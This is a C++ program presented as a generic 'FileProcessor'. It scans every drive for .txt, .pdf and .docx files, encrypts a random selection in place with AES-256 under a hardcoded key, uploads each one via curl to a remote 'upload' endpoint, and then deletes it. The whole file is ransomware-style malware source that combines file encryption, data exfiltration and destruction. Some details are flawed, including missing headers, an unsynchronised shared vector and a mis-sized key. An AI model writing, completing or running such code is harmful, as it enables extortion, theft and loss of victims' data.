#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <random>
#include <fstream>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <thread>
#include <atomic>

class FileProcessor {
public:
    // Get all available drives on the system
    static std::vector<std::string> getAllDrives() {
        std::vector<std::string> drives;

        #ifdef _WIN32
        // Windows drive discovery (A to Z)
        char drive[4] = "C:\\";
        for (drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++) {
            if (GetDriveTypeA(drive) > 1) {
                drives.push_back(std::string(drive));
            }
        }
        #else
        // Unix-like systems drive paths
        drives = {"/", "/home", "/usr", "/mnt"};
        #endif

        return drives;
    }

    // Find files across all drives matching specified extensions
    static std::vector<std::string> findFilesAcrossSystem(
        const std::vector<std::string>& extensions, 
        bool excludeSystemDirs = true
    ) {
        std::vector<std::string> allMatchedFiles;
        std::vector<std::string> drives = getAllDrives();

        // Create threads for each drive to search files in parallel
        std::vector<std::thread> threads;
        std::atomic<int> totalFilesProcessed{0};

        for (const auto& rootPath : drives) {
            threads.push_back(std::thread([rootPath, &allMatchedFiles, &totalFilesProcessed, &extensions, excludeSystemDirs]() {
                try {
                    // Recursively search each drive for matching files
                    auto driveFiles = findFilesByExtension(rootPath, extensions, excludeSystemDirs);
                    allMatchedFiles.insert(allMatchedFiles.end(), driveFiles.begin(), driveFiles.end());
                    totalFilesProcessed += driveFiles.size();
                } catch (const std::exception& e) {
                    std::cerr << "Error searching drive " << rootPath << ": " << e.what() << std::endl;
                }
            }));
        }

        // Wait for all threads to finish
        for (auto& th : threads) {
            th.join();
        }

        std::cout << "Total files processed: " << totalFilesProcessed.load() << std::endl;
        return allMatchedFiles;
    }

    // Encrypt a file in place
    static bool encryptFileInPlace(const std::string& filePath, const std::string& key) {
        // Check if file exists before attempting to open
        if (!std::filesystem::exists(filePath)) {
            std::cerr << "File does not exist: " << filePath << std::endl;
            return false;
        }

        // Open the file in binary mode and read its contents
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile.is_open()) {
            std::cerr << "Failed to open file: " << filePath << std::endl;
            return false;
        }

        // Read file content into memory
        std::string fileContent((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();

        // Generate a random IV (Initialization Vector) for encryption
        unsigned char iv[AES_BLOCK_SIZE];
        if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
            std::cerr << "Failed to generate IV" << std::endl;
            return false;
        }

        // Buffer to hold encrypted content
        std::vector<unsigned char> encryptedContent(fileContent.size() + AES_BLOCK_SIZE);
        int encryptedLen = 0, finalLen = 0;

        // Create encryption context
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            std::cerr << "Failed to create encryption context" << std::endl;
            return false;
        }

        // Initialize encryption with AES-256-CBC mode
        if (!EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, 
            reinterpret_cast<const unsigned char*>(key.c_str()), iv)) {
            std::cerr << "Failed to initialize encryption" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        // Encrypt the file content
        if (!EVP_EncryptUpdate(ctx, encryptedContent.data(), &encryptedLen, 
            reinterpret_cast<const unsigned char*>(fileContent.data()), fileContent.size())) {
            std::cerr << "Encryption failed" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        // Finalize encryption (ensures padding is correct)
        if (!EVP_EncryptFinal_ex(ctx, encryptedContent.data() + encryptedLen, &finalLen)) {
            std::cerr << "Failed to finalize encryption" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        EVP_CIPHER_CTX_free(ctx);

        // Overwrite the original file with encrypted content
        std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
        if (!outFile.is_open()) {
            std::cerr << "Failed to open file for writing: " << filePath << std::endl;
            return false;
        }

        // Write IV and encrypted data to file
        outFile.write(reinterpret_cast<char*>(iv), AES_BLOCK_SIZE);
        outFile.write(reinterpret_cast<char*>(encryptedContent.data()), encryptedLen + finalLen);

        return true;
    }

    // Upload the file to a server
    static bool uploadFile(const std::string& filePath) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "Failed to initialize CURL" << std::endl;
            return false;
        }

        struct curl_httppost* formpost = NULL;
        struct curl_httppost* lastptr = NULL;

        // Prepare the file to be uploaded
        curl_formadd(&formpost, &lastptr,
            CURLFORM_COPYNAME, "file",
            CURLFORM_FILE, filePath.c_str(),
            CURLFORM_END);

        // Specify upload URL
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost.com/upload");
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

        // Perform the upload
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "CURL upload failed: " << curl_easy_strerror(res) << std::endl;
        }

        // Cleanup CURL resources
        curl_formfree(formpost);
        curl_easy_cleanup(curl);

        return (res == CURLE_OK);
    }

    // Process a set of random files: encrypt, upload, and delete
    static void processRandomFiles(const std::vector<std::string>& allFiles, 
                                   const std::string& encryptionKey, 
                                   int numFiles = 10) {
        // Select random files to process (limit to available files)
        int selectCount = std::min(numFiles, static_cast<int>(allFiles.size()));

        std::vector<std::string> selectedFiles;
        std::sample(
            allFiles.begin(), allFiles.end(), 
            std::back_inserter(selectedFiles), 
            selectCount, 
            std::mt19937{std::random_device{}()}
        );

        // Create threads for file processing to run in parallel
        std::vector<std::thread> threads;
        for (const auto& file : selectedFiles) {
            threads.push_back(std::thread([file, &encryptionKey]() {
                if (encryptFileInPlace(file, encryptionKey)) {
                    if (uploadFile(file)) {
                        // Delete file after successful upload
                        std::filesystem::remove(file);
                    }
                }
            }));
        }

        // Wait for all threads to finish
        for (auto& th : threads) {
            th.join();
        }
    }

private:
    // Find files by extensions in a given directory
    static std::vector<std::string> findFilesByExtension(
        const std::string& rootPath, 
        const std::vector<std::string>& extensions, 
        bool excludeSystemDirs = true
    ) {
        std::vector<std::string> matchedFiles;
        std::vector<std::string> normalizedExtensions;

        // Normalize extensions to lowercase
        for (const auto& ext : extensions) {
            normalizedExtensions.push_back(toLowercase(ext));
        }

        try {
            // Iterate through directory recursively
            for (const auto& entry : std::filesystem::recursive_directory_iterator(rootPath, 
                std::filesystem::directory_options::skip_permission_denied)) {
                
                // Skip system directories if specified
                if (excludeSystemDirs && isSystemPath(entry.path().string())) {
                    continue;
                }

                // Check if file matches any of the specified extensions
                if (entry.is_regular_file()) {
                    std::string extension = toLowercase(entry.path().extension().string());
                    if (std::find(normalizedExtensions.begin(), normalizedExtensions.end(), extension) != normalizedExtensions.end()) {
                        matchedFiles.push_back(entry.path().string());
                    }
                }
            }
        }
        catch (const std::filesystem::filesystem_error& e) {
            std::cerr << "Error processing directory " << rootPath << ": " << e.what() << std::endl;
        }

        return matchedFiles;
    }

    // Convert string to lowercase
    static std::string toLowercase(const std::string& str) {
        std::string lowerStr = str;
        std::transform(lowerStr.begin(), lowerStr.end(), lowerStr.begin(), ::tolower);
        return lowerStr;
    }

    // Check if a path is a system directory
    static bool isSystemPath(const std::string& path) {
        return path.find("/system") != std::string::npos || 
               path.find("Program Files") != std::string::npos;
    }
};

int main() {
    std::string encryptionKey = "ThisIsASecretKeyThatShouldBeRandomized";
    std::vector<std::string> extensions = {".txt", ".pdf", ".docx"};

    // Step 1: Get all files across the system that match the extensions
    std::vector<std::string> files = FileProcessor::findFilesAcrossSystem(extensions);

    // Step 2: Process the files (encrypt, upload, and delete) in parallel
    FileProcessor::processRandomFiles(files, encryptionKey);

    return 0;
}
